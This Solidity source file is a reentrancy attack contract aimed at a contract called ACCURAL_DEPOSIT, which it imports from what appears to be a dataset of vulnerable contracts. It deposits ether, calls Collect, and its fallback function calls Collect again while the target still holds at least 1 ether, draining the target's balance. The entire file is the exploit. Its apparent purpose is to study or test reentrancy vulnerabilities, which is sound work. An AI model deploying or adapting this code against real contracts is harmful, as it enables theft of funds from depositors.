pragma solidity ^0.4.19;
import "../dataset/reentrancy/0x4320e6f8c05b27ab4707cd1f6d5ce6f3e4b3a5a1.sol";

contract MaliciousContract{
    ACCURAL_DEPOSIT accural_deposit;
    

    constructor(address _victimAddress) public{
        accural_deposit= ACCURAL_DEPOSIT (_victimAddress);
    }

    function attack(uint amount)  public {
        require(amount >= 1 ether , "Must attempt an attack for at least 1 ether");
        accural_deposit.Collect(amount);
    }

    function deposit()  public payable{
        require(msg.value >= 1 ether, "Must add at least 1 ether");
        accural_deposit.Deposit.value(msg.value)();    
    }
    

    function() payable public {
        // Re-enter the vulnerable function if there's still balance to collect   
        if ( address(accural_deposit).balance >= 1 ether) {
            accural_deposit.Collect(1 ether);
        }
    }
}